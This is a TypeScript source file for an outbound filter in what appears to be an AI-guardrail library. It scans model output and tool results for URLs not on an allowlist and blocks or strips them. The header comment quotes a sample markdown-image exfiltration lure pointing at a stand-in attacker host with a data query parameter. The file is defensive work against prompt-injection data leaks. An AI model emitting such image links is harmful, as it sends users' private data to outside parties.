// opensentry/egress — outbound exfiltration filter (PLAN.md §11a).
// Scans model output / tool-call results for disallowed URLs (especially markdown-image
// exfil lures `![alt](https://attacker.com/exfil?data=...)`) and blocks or strips them
// against a caller-supplied allowlist. Zero Node builtins — pure string + regex.

import type { Reason, Verdict } from '../types.js';

export interface EgressPolicy {
  allowlist: (string | RegExp)[];
  stripDisallowed?: boolean;
}

export interface EgressResult {
  safe: string;
  verdict: Verdict;
  reasons: Reason[];
}

// Matches markdown images ![alt](url) and bare http/https/ftp URLs.
const URL_RE = /!\[([^\]]*)\]\(\s*([^)\s]+)(?:\s+"[^"]*")?\)|(?:https?|ftp):\/\/[^\s)<>"']+/g;

function urlAllowed(url: string, allowlist: (string | RegExp)[]): boolean {
  return allowlist.some((entry) => {
    if (typeof entry === 'string') return url.startsWith(entry);
    return entry.test(url);
  });
}

export function egressFilter(text: string, policy: EgressPolicy): EgressResult {
  const reasons: Reason[] = [];
  const disallowed: { start: number; end: number; url: string; isImage: boolean }[] = [];

  URL_RE.lastIndex = 0;
  let m: RegExpExecArray | null;
  while ((m = URL_RE.exec(text)) !== null) {
    const isImage = m[0].startsWith('![');
    const url = isImage ? (m[2] ?? '') : m[0];
    if (!urlAllowed(url, policy.allowlist)) {
      disallowed.push({
        start: m.index,
        end: m.index + m[0].length,
        url,
        isImage,
      });
      reasons.push({
        code: 'exfil_markdown_image',
        category: 'exfil',
        weight: 1,
        message: isImage
          ? `Disallowed markdown image URL: ${url}`
          : `Disallowed egress URL: ${url}`,
        hardBlock: true,
      });
    }
  }

  let safe = text;
  if (disallowed.length > 0 && policy.stripDisallowed) {
    for (let i = disallowed.length - 1; i >= 0; i--) {
      const d = disallowed[i];
      if (d) safe = safe.slice(0, d.start) + safe.slice(d.end);
    }
  }

  return {
    safe,
    verdict: reasons.length > 0 ? 'block' : 'allow',
    reasons,
  };
}
